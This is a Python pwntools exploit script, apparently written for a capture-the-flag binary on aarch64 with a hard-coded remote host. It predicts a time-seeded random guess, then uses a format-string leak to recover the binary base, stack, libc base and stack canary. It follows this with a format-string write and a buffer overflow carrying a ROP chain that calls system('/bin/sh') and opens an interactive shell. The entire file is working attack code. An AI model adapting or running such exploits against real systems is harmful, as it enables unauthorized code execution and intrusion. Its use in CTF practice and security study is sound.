#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '152.69.210.130', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(['./qemu_aarch64', '-g', '1234', './chall'] + argv)

gdbscript = '''
init-pwndbg

# cmp, set $w1 = $w0
breakrva 0xe30

# printf
breakrva 0xd00

# fmstr ret
breakrva 0xd74

# bof ret
breakrva 0xc5c

continue
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     aarch64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def exploit():
    global io
    io = initialize()

    lib.srand(lib.time(None))
    rand = lib.rand() % 10000 + 1
    io.sendlineafter(b'guess:', str(rand).encode())
    
    io.sendlineafter(b'spell:', b'%4$p|%8$p|%33$p|%21$p|')
    io.recvuntil(b'0x')
    elf.address = int(io.recvuntil(b'|', drop=True), 16) - 0x10b1
    bof_func = elf.address + 0xbd8
    stack = int(io.recvuntil(b'|', drop=True), 16)
    rip = stack - 0x68
    libc.address = int(io.recvuntil(b'|', drop=True), 16) - 152 - libc.sym['__libc_start_main']
    canary = int(io.recvuntil(b'|', drop=True), 16)

    payload = fmtstr_payload(12, {rip: bof_func}, write_size='short')
    io.sendlineafter(b'spell:', payload)
    
    # refer to: https://hyggehalcyon.gitbook.io/page/ctfs/2024/b01lers-ctf#exploitation-4
    # ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
    gadget = libc.address + 0x0000000000069500
    payload = flat({
        128: [
            canary,
            stack+0x20,
            gadget,
            0,
            canary,
        ]
    })
    payload += b'A' * 8
    payload += p64(libc.sym['system'])  # x1 and x2 already NULL
    payload += b'B' * 8
    payload += p64(next(libc.search(b'/bin/sh\x00')))
    io.sendlineafter(b'name:', payload)

    log.info('elf base: %#x', elf.address)
    log.info('libc base: %#x', libc.address)
    log.info('rip: %#x', rip)
    log.info('canary: %#x', canary)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
